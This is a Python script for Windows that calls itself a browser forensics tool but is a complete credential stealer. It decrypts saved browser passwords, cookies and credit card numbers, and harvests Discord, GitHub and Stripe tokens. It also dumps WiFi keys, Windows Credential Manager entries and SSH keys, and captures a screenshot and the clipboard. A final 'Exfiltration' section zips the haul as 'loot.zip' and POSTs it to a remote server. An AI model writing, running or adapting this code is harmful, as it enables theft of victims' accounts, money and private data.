import os, json, base64, shutil, sqlite3, tempfile, socket, platform, urllib.request
import subprocess, ctypes, ctypes.wintypes, winreg, re, threading, io
from datetime import datetime
from pathlib import Path 
from concurrent.futures import ThreadPoolExecutor, as_completed
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import win32crypt, win32gui, win32ui, win32con, win32clipboard
from PIL import Image

OUT = Path("output")
W   = 70

BANNER = r"""
╔══════════════════════════════════════════════════════════════════════╗
║               BROWSER FORENSICS — FULL LOCAL DUMP                   ║
╚══════════════════════════════════════════════════════════════════════╝
"""

TOKEN_PATTERNS = {
    "Discord" : re.compile(r"([\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84})"),
    "GitHub"  : re.compile(r"ghp_[A-Za-z0-9]{36}"),
    "Google"  : re.compile(r"ya29\.[A-Za-z0-9_\-]+"),
    "Twitter" : re.compile(r"[1-9][0-9]{5,20}-[A-Za-z0-9]{20,40}"),
    "Stripe"  : re.compile(r"(sk|pk)_(live|test)_[A-Za-z0-9]{24,}"),
}

def ts():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def sec(title):
    pad = W - len(title) - 4
    l, r = pad // 2, pad - pad // 2
    return f"\n╔{'═'*(W-2)}╗\n║ {'─'*l} {title} {'─'*r} ║\n╚{'═'*(W-2)}╝\n"

def sub(title):
    return f"\n  ┌─ {title} {'─'*max(0,W-len(title)-6)}┐\n"

def row(*cols):
    return "  │  " + "   │   ".join(str(c)[:45] for c in cols) + "\n"

def div():
    return f"  └{'─'*(W-2)}┘\n"

def run(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode("cp850", errors="ignore")
    except:
        return ""

def safe_copy(src, dst):
    try:
        shutil.copy2(src, dst); return True
    except PermissionError:
        try:
            h = ctypes.windll.kernel32.CreateFileW(str(src), 0x80000000, 0x07, None, 3, 0, None)
            if h == ctypes.wintypes.HANDLE(-1).value: return False
            size = os.path.getsize(src)
            buf  = ctypes.create_string_buffer(size)
            rd   = ctypes.wintypes.DWORD(0)
            ctypes.windll.kernel32.ReadFile(h, buf, size, ctypes.byref(rd), None)
            ctypes.windll.kernel32.CloseHandle(h)
            with open(dst, "wb") as f: f.write(buf.raw[:rd.value])
            return rd.value > 0
        except: return False

def query_db(db_path, query):
    tmp = Path(tempfile.gettempdir()) / f"_tmp_{db_path.name}"
    if not safe_copy(db_path, tmp): return []
    try:
        con  = sqlite3.connect(f"file:{tmp}?mode=ro", uri=True)
        rows = con.cursor().execute(query).fetchall()
        con.close(); return rows
    except: return []
    finally: tmp.unlink(missing_ok=True)

def master_key(ls):
    with open(ls, "r", encoding="utf-8") as f: data = json.load(f)
    enc = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1]

def decrypt(key, enc):
    if not enc: return ""
    try:
        if enc[:3] == b"v10":
            return AESGCM(key).decrypt(enc[3:15], enc[3:], None).decode("utf-8", errors="ignore")
        return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode("utf-8", errors="ignore")
    except: return ""

def scan_tokens(text):
    found = {}
    for svc, pat in TOKEN_PATTERNS.items():
        matches = pat.findall(text)
        if matches:
            found[svc] = list(set(m if isinstance(m, str) else m[0] for m in matches))
    return found

def screenshot():
    try:
        w  = win32gui.GetSystemMetrics(0)
        h  = win32gui.GetSystemMetrics(1)
        hw = win32gui.GetDesktopWindow()
        dc = win32gui.GetWindowDC(hw)
        s  = win32ui.CreateDCFromHandle(dc)
        m  = s.CreateCompatibleDC()
        bm = win32ui.CreateBitmap()
        bm.CreateCompatibleBitmap(s, w, h)
        m.SelectObject(bm)
        m.BitBlt((0,0),(w,h),s,(0,0),win32con.SRCCOPY)
        bmp = OUT / "screenshot.bmp"
        bm.SaveBitmapFile(m, str(bmp))
        m.DeleteDC(); s.DeleteDC()
        win32gui.DeleteObject(bm.GetHandle())
        win32gui.ReleaseDC(hw, dc)
        Image.open(bmp).save(OUT / "screenshot.png")
        bmp.unlink(missing_ok=True)
        return True
    except: return False

def clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
        win32clipboard.CloseClipboard()
        return data
    except:
        try: win32clipboard.CloseClipboard()
        except: pass
        return ""

def get_profiles(ud):
    if not ud.exists(): return []
    return [p for p in ud.iterdir()
            if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))]

# ── Chromium dumps ────────────────────────────────────────────────────────────

def dump_cookies(browser, profile, key, main_out, ck_out, tok_buf):
    path = profile / "Network" / "Cookies"
    if not path.exists(): path = profile / "Cookies"
    if not path.exists(): return
    rows = query_db(path, "SELECT host_key,name,path,is_secure,expires_utc,encrypted_value FROM cookies")
    if not rows: return
    header = sub(f"{browser} › {profile.name} › Cookies ({len(rows)})")
    cols   = row("HOST","NAME","VALUE","PATH","SCHEME","EXPIRES")
    sep    = f"  │{'─'*(W-2)}│\n"
    main_out.write(header + cols + sep)
    ck_out.write(header + cols + sep)
    for host, name, p, secure, exp, enc in rows:
        val = decrypt(key, enc)
        if val:
            line = row(host, name, val, p, "HTTPS" if secure else "HTTP", exp)
            main_out.write(line)
            ck_out.write(line)
            for svc, tokens in scan_tokens(val).items():
                for t in tokens:
                    tok_buf.append(f"  [{svc}]\n  host  = {host}\n  name  = {name}\n  token = {t}\n  {'─'*50}\n")
    main_out.write(div()); ck_out.write(div())

def dump_passwords(browser, profile, key, out):
    path = profile / "Login Data"
    if not path.exists(): return
    rows = query_db(path, "SELECT origin_url,username_value,password_value,date_created FROM logins")
    if not rows: return
    out.write(sub(f"{browser} › {profile.name} › Passwords ({len(rows)})"))
    out.write(row("URL","USERNAME","PASSWORD","CREATED"))
    out.write(f"  │{'─'*(W-2)}│\n")
    for url, user, enc, created in rows:
        passwd = decrypt(key, enc)
        if user or passwd: out.write(row(url, user, passwd, created))
    out.write(div())

def dump_history(browser, profile, out):
    path = profile / "History"
    if not path.exists(): return
    rows = query_db(path, "SELECT url,title,visit_count,last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500")
    if not rows: return
    out.write(sub(f"{browser} › {profile.name} › History (top 500)"))
    out.write(row("URL","TITLE","VISITS","LAST VISIT"))
    out.write(f"  │{'─'*(W-2)}│\n")
    for url, title, count, last in rows:
        out.write(row(url, title or "", count, last))
    out.write(div())

def dump_downloads(browser, profile, out):
    path = profile / "History"
    if not path.exists(): return
    rows = query_db(path, "SELECT target_path,tab_url,total_bytes,start_time FROM downloads ORDER BY start_time DESC LIMIT 200")
    if not rows: return
    out.write(sub(f"{browser} › {profile.name} › Downloads ({len(rows)})"))
    out.write(row("PATH","SOURCE URL","SIZE","TIME"))
    out.write(f"  │{'─'*(W-2)}│\n")
    for target, url, size, start in rows:
        out.write(row(target or "", url or "", size, start))
    out.write(div())

def dump_autofill(browser, profile, out):
    path = profile / "Web Data"
    if not path.exists(): return
    rows = query_db(path, "SELECT name,value,count,date_last_used FROM autofill ORDER BY count DESC")
    if not rows: return
    out.write(sub(f"{browser} › {profile.name} › Autofill ({len(rows)})"))
    out.write(row("FIELD","VALUE","USES","LAST USED"))
    out.write(f"  │{'─'*(W-2)}│\n")
    for name, value, count, last in rows:
        out.write(row(name or "", value or "", count, last))
    out.write(div())

def dump_cards(browser, profile, key, out):
    path = profile / "Web Data"
    if not path.exists(): return
    rows = query_db(path, "SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted,billing_address_id FROM credit_cards")
    if not rows: return
    out.write(sub(f"{browser} › {profile.name} › Credit Cards ({len(rows)})"))
    out.write(row("NAME","NUMBER","EXPIRY","BILLING ID"))
    out.write(f"  │{'─'*(W-2)}│\n")
    for name, month, year, enc, addr in rows:
        num = decrypt(key, enc)
        if num: out.write(row(name or "", num, f"{month}/{year}", addr or ""))
    out.write(div())

def dump_bookmarks(browser, profile, out):
    path = profile / "Bookmarks"
    if not path.exists(): return
    try:
        data = json.loads(path.read_text(encoding="utf-8", errors="ignore"))
        entries = []
        def walk(node):
            if node.get("type") == "url": entries.append((node.get("name",""), node.get("url","")))
            for c in node.get("children",[]): walk(c)
        for root in data.get("roots",{}).values(): walk(root)
        if not entries: return
        out.write(sub(f"{browser} › {profile.name} › Bookmarks ({len(entries)})"))
        out.write(row("NAME","URL"))
        out.write(f"  │{'─'*(W-2)}│\n")
        for name, url in entries: out.write(row(name, url))
        out.write(div())
    except: pass

def dump_extensions(browser, profile, out):
    ext_dir = profile / "Extensions"
    if not ext_dir.exists(): return
    out.write(sub(f"{browser} › {profile.name} › Extensions"))
    for ext in ext_dir.iterdir():
        if not ext.is_dir(): continue
        for ver in sorted(ext.iterdir(), reverse=True):
            manifest = ver / "manifest.json"
            if manifest.exists():
                try:
                    d = json.loads(manifest.read_text(encoding="utf-8", errors="ignore"))
                    out.write(f"  {ext.name[:40]:<42} {d.get('name','')[:30]:<32} v{d.get('version','')}\n")
                except: pass
                break
    out.write(div())

def process_browser(name, user_data, ck_out, tok_buf):
    ls = user_data / "Local State"
    if not ls.exists(): return name, ""
    try: key = master_key(ls)
    except: return name, ""
    profiles = get_profiles(user_data)
    if not profiles: return name, ""
    buf = io.StringIO()
    buf.write(sec(f"{name.upper()} BROWSER"))
    for profile in profiles:
        dump_cookies(name, profile, key, buf, ck_out, tok_buf)
        dump_passwords(name, profile, key, buf)
        dump_history(name, profile, buf)
        dump_downloads(name, profile, buf)
        dump_autofill(name, profile, buf)
        dump_cards(name, profile, key, buf)
        dump_bookmarks(name, profile, buf)
        dump_extensions(name, profile, buf)
    return name, buf.getvalue()

# ── Firefox ───────────────────────────────────────────────────────────────────

def dump_firefox(main_out, ck_out, tok_buf):
    root = Path(os.environ["APPDATA"]) / "Mozilla/Firefox/Profiles"
    if not root.exists(): return
    main_out.write(sec("FIREFOX"))
    for profile in root.iterdir():
        cdb = profile / "cookies.sqlite"
        if cdb.exists():
            rows = query_db(cdb, "SELECT host,name,value,path,isSecure,expiry FROM moz_cookies")
            if rows:
                header = sub(f"Firefox › {profile.name} › Cookies ({len(rows)})")
                cols   = row("HOST","NAME","VALUE","PATH","SCHEME","EXPIRY")
                sep    = f"  │{'─'*(W-2)}│\n"
                main_out.write(header + cols + sep)
                ck_out.write(header + cols + sep)
                for r in rows:
                    line = row(r[0] or "", r[1] or "", r[2] or "", r[3] or "", "HTTPS" if r[4] else "HTTP", r[5])
                    main_out.write(line); ck_out.write(line)
                    for svc, tokens in scan_tokens(r[2] or "").items():
                        for t in tokens:
                            tok_buf.append(f"  [{svc}]\n  host  = {r[0]}\n  name  = {r[1]}\n  token = {t}\n  {'─'*50}\n")
                main_out.write(div()); ck_out.write(div())
        hdb = profile / "places.sqlite"
        if hdb.exists():
            rows = query_db(hdb, "SELECT url,title,visit_count,last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 500")
            if rows:
                main_out.write(sub(f"Firefox › {profile.name} › History (top 500)"))
                main_out.write(row("URL","TITLE","VISITS","LAST VISIT"))
                main_out.write(f"  │{'─'*(W-2)}│\n")
                for r in rows: main_out.write(row(r[0] or "", r[1] or "", r[2], r[3]))
                main_out.write(div())

# ── System sections ───────────────────────────────────────────────────────────

def dump_sysinfo(out):
    out.write(sec("SYSTEM INFORMATION"))
    out.write(f"  Hostname    : {socket.gethostname()}\n")
    out.write(f"  User        : {os.environ.get('USERNAME','')}\n")
    out.write(f"  Domain      : {os.environ.get('USERDOMAIN','')}\n")
    out.write(f"  OS          : {platform.version()}\n")
    out.write(f"  Arch        : {platform.machine()}\n")
    out.write(f"  Processor   : {platform.processor()}\n")
    try: out.write(f"  Local IP    : {socket.gethostbyname(socket.gethostname())}\n")
    except: pass
    for line in run("nslookup myip.opendns.com resolver1.opendns.com").splitlines():
        if "Address" in line and "resolver" not in line.lower():
            out.write(f"  External IP : {line.split()[-1]}\n"); break

def dump_env(out):
    out.write(sec("ENVIRONMENT VARIABLES"))
    for k, v in sorted(os.environ.items()):
        out.write(f"  {k:<40} = {v}\n")

def dump_processes(out):
    out.write(sec("RUNNING PROCESSES"))
    out.write(row("NAME","PID","SESSION","MEM"))
    out.write(f"  │{'─'*(W-2)}│\n")
    for line in run("tasklist /fo csv /nh").strip().splitlines():
        p = [x.strip('"') for x in line.split('","')]
        if len(p) >= 5: out.write(row(p[0],p[1],p[2],p[4]))
    out.write(div())

def dump_network(out):
    out.write(sec("NETWORK CONFIG")); out.write(run("ipconfig /all"))

def dump_arp(out):
    out.write(sec("ARP TABLE")); out.write(run("arp -a"))

def dump_netstat(out):
    out.write(sec("ACTIVE CONNECTIONS")); out.write(run("netstat -ano"))

def dump_shares(out):
    out.write(sec("NETWORK SHARES")); out.write(run("net share"))

def dump_wifi(out):
    out.write(sec("SAVED WIFI PASSWORDS"))
    for line in run("netsh wlan show profiles").splitlines():
        if "All User Profile" in line:
            ssid = line.split(":",1)[1].strip()
            pwd  = ""
            for d in run(f'netsh wlan show profile name="{ssid}" key=clear').splitlines():
                if "Key Content" in d: pwd = d.split(":",1)[1].strip(); break
            out.write(f"  SSID: {ssid:<35} PASS: {pwd or '(none)'}\n")

def dump_users(out):
    out.write(sec("LOCAL USERS & GROUPS"))
    out.write(run("net user")); out.write(run("net localgroup administrators"))

def dump_drives(out):
    out.write(sec("DRIVES"))
    out.write(run("wmic logicaldisk get caption,description,filesystem,freespace,size"))

def dump_tasks(out):
    out.write(sec("SCHEDULED TASKS")); out.write(run("schtasks /query /fo LIST /v"))

def dump_startup(out):
    out.write(sec("STARTUP ITEMS"))
    out.write(run("wmic startup get Caption,Command,Location /format:list"))

def dump_eventlog(out):
    out.write(sec("EVENT LOG — LAST 50 SYSTEM ERRORS"))
    out.write(run('wevtutil qe System /c:50 /rd:true /f:text /q:"*[System[Level=2]]"'))

def dump_recent(out):
    out.write(sec("RECENT FILES"))
    recent = Path(os.environ["APPDATA"]) / "Microsoft/Windows/Recent"
    if recent.exists():
        for f in sorted(recent.glob("*.lnk"), key=lambda x: x.stat().st_mtime, reverse=True)[:100]:
            out.write(f"  {f.stem}\n")

def dump_installed(out):
    out.write(sec("INSTALLED SOFTWARE"))
    for line in run("wmic product get name,version /format:csv").strip().splitlines()[1:]:
        p = line.strip().split(",")
        if len(p) >= 3 and p[1].strip():
            out.write(f"  {p[1].strip():<50} {p[2].strip()}\n")

def dump_registry(out):
    out.write(sec("REGISTRY"))
    def rk(hive, path, label):
        out.write(sub(label))
        try:
            key = winreg.OpenKey(hive, path)
            i = 0
            while True:
                try:
                    name, val, _ = winreg.EnumValue(key, i)
                    out.write(f"  {name:<40} = {str(val)[:80]}\n"); i += 1
                except OSError: break
            winreg.CloseKey(key)
        except: pass
        out.write(div())
    rk(winreg.HKEY_CURRENT_USER,  r"Software\Microsoft\Windows\CurrentVersion\Run",     "HKCU Run")
    rk(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run",     "HKLM Run")
    rk(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "HKLM RunOnce")
    rk(winreg.HKEY_CURRENT_USER,  r"Software\Microsoft\Internet Explorer\TypedURLs",    "IE Typed URLs")
    rk(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion",      "OS Info")

def dump_usb(out):
    out.write(sec("USB DEVICE HISTORY"))
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Enum\USBSTOR")
        i = 0
        while True:
            try: out.write(f"  {winreg.EnumKey(key, i)}\n"); i += 1
            except OSError: break
        winreg.CloseKey(key)
    except: out.write("  (none)\n")

def dump_ssh(out):
    out.write(sec("SSH KEYS"))
    ssh_dir = Path(os.environ.get("USERPROFILE","")) / ".ssh"
    if not ssh_dir.exists(): out.write("  (none found)\n"); return
    for f in ssh_dir.iterdir():
        try:
            out.write(sub(f.name))
            out.write(f.read_text(encoding="utf-8", errors="ignore")[:3000] + "\n")
            out.write(div())
        except: pass

def dump_credman(out):
    out.write(sec("WINDOWS CREDENTIAL MANAGER"))
    try:
        import win32cred
        for c in win32cred.CredEnumerate(None, 0):
            blob = c.get("CredentialBlob", b"")
            try:    passwd = blob.decode("utf-16-le", errors="ignore")
            except: passwd = repr(blob[:50])
            out.write(f"  TARGET : {c.get('TargetName','')}\n")
            out.write(f"  USER   : {c.get('UserName','')}\n")
            out.write(f"  PASS   : {passwd}\n")
            out.write(f"  {'─'*50}\n")
    except Exception as e:
        out.write(f"  error: {e}\n")

def dump_ps_history(out):
    out.write(sec("POWERSHELL HISTORY"))
    hist = Path(os.environ.get("APPDATA","")) / "Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt"
    out.write(hist.read_text(encoding="utf-8", errors="ignore")[:10000] if hist.exists() else "  (none)\n")

def dump_hosts(out):
    out.write(sec("HOSTS FILE"))
    h = Path(r"C:\Windows\System32\drivers\etc\hosts")
    if h.exists(): out.write(h.read_text(encoding="utf-8", errors="ignore"))

def build_html(txt_path):
    content = txt_path.read_text(encoding="utf-8", errors="ignore")
    content = content.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Forensics Report — {ts()}</title>
<style>
  body{{background:#0d0d0d;color:#c8c8c8;font-family:'Courier New',monospace;font-size:13px;margin:20px}}
  pre{{white-space:pre-wrap;word-break:break-all}}
  .bar{{position:fixed;top:10px;right:10px;display:flex;gap:6px}}
  input{{background:#1a1a1a;color:#fff;border:1px solid #444;padding:4px 8px;font-size:13px;width:220px}}
  button{{background:#2a2a2a;color:#ccc;border:1px solid #555;padding:4px 10px;cursor:pointer;font-size:13px}}
  .hl{{background:#3a3a00;color:#ffe}}
</style>
</head>
<body>
<div class="bar">
  <input id="q" placeholder="Search…" oninput="highlight(this.value)">
  <button onclick="document.getElementById('q').value='';highlight('')">Clear</button>
</div>
<pre id="content">{content}</pre>
<script>
const raw=document.getElementById('content').innerHTML;
function highlight(q){{
  const el=document.getElementById('content');
  if(!q){{el.innerHTML=raw;return}}
  const re=new RegExp(q.replace(/[.*+?^${{}}()|[\\]\\\\]/g,'\\\\$&'),'gi');
  el.innerHTML=raw.replace(re,m=>'<span class="hl">'+m+'</span>');
}}
</script>
</body>
</html>"""
    p = txt_path.parent / "report.html"
    p.write_text(html, encoding="utf-8")
    return p

# ── Entry ─────────────────────────────────────────────────────────────────────

def main():
    OUT.mkdir(exist_ok=True)
    local   = Path(os.environ["LOCALAPPDATA"])
    roaming = Path(os.environ["APPDATA"])

    browsers = [
        ("Chrome",   local   / "Google"         / "Chrome"           / "User Data"),
        ("Edge",     local   / "Microsoft"      / "Edge"             / "User Data"),
        ("Brave",    local   / "BraveSoftware"  / "Brave-Browser"    / "User Data"),
        ("Opera",    roaming / "Opera Software" / "Opera Stable"),
        ("Opera GX", roaming / "Opera Software" / "Opera GX Stable"),
        ("Vivaldi",  local   / "Vivaldi"        / "User Data"),
        ("Yandex",   local   / "Yandex"         / "YandexBrowser"    / "User Data"),
        ("Chromium", local   / "Chromium"       / "User Data"),
        ("Torch",    local   / "Torch"          / "User Data"),
        ("Comodo",   local   / "Comodo"         / "Dragon"           / "User Data"),
    ]

    print("[*] Screenshot..."); screenshot()
    clip    = clipboard()
    tok_buf = []

    ck_file  = open(OUT / "cookies.txt",  "w", encoding="utf-8")
    tok_file = open(OUT / "tokens.txt",   "w", encoding="utf-8")

    ck_file.write(BANNER)
    ck_file.write(f"  Cookies dump : {ts()}\n{'='*W}\n")
    tok_file.write(BANNER)
    tok_file.write(f"  Tokens dump  : {ts()}\n{'='*W}\n")

    with open(OUT / "output.txt", "w", encoding="utf-8") as out:
        out.write(BANNER)
        out.write(f"  Generated : {ts()}\n")
        out.write(f"  Host      : {socket.gethostname()}\n")
        out.write(f"  User      : {os.environ.get('USERNAME','')}\n")
        out.write("=" * W + "\n")

        for fn in [dump_sysinfo, dump_env, dump_network, dump_arp, dump_netstat,
                   dump_shares, dump_wifi, dump_processes, dump_installed,
                   dump_drives, dump_users, dump_eventlog, dump_registry,
                   dump_usb, dump_recent, dump_startup, dump_tasks,
                   dump_ps_history, dump_hosts, dump_ssh, dump_credman]:
            fn(out)

        if clip:
            out.write(sec("CLIPBOARD"))
            out.write(clip[:5000] + "\n")

        print("[*] Dumping browsers (parallel)...")
        with ThreadPoolExecutor(max_workers=6) as pool:
            futures = {pool.submit(process_browser, name, ud, ck_file, tok_buf): name
                       for name, ud in browsers}
            blocks = {}
            for f in as_completed(futures):
                name, block = f.result()
                blocks[name] = block
                if block: print(f"  [+] {name}")

        for name, _ in browsers:
            if blocks.get(name): out.write(blocks[name])

        dump_firefox(out, ck_file, tok_buf)

        if tok_buf:
            out.write(sec("EXTRACTED TOKENS SUMMARY"))
            for t in tok_buf: out.write(t)

        out.write("\n" + "="*W + "\n")
        out.write(f"  Dump completed: {ts()}\n")
        out.write("="*W + "\n")

    if tok_buf:
        tok_file.write(sec("EXTRACTED TOKENS"))
        for t in tok_buf: tok_file.write(t)
    else:
        tok_file.write("  (no tokens found)\n")

    ck_file.write("\n" + "="*W + "\n")
    ck_file.write(f"  Done: {ts()}\n" + "="*W + "\n")
    ck_file.close(); tok_file.close()

    html_path = build_html(OUT / "output.txt")
    print(f"[+] output/output.txt")
    print(f"[+] output/cookies.txt")
    print(f"[+] output/tokens.txt")
    print(f"[+] output/report.html")
    print(f"[+] output/screenshot.png")

# ── Exfiltration ──────────────────────────────────────────────────────────
    try:
        print("[*] compressing output...")
        zip_path = OUT.parent / "loot.zip"
        if zip_path.exists(): zip_path.unlink()
        shutil.make_archive(str(OUT.parent / "loot"), "zip", OUT)
        
        if zip_path.exists():
            print("[*] sending archive to server...")
            with open(zip_path, "rb") as f:
                data = f.read()
            
            req = urllib.request.Request(
                "http://<192.168.1.105>:8080/loot.zip", 
                data=data, 
                method="POST"
            )
            req.add_header("Content-Type", "application/zip")
            urllib.request.urlopen(req, timeout=30)
            print("[+] exfiltration completed.")
    except Exception as e:
        print(f"[-] exfiltration failed: {e}")
if __name__ == "__main__":
    main()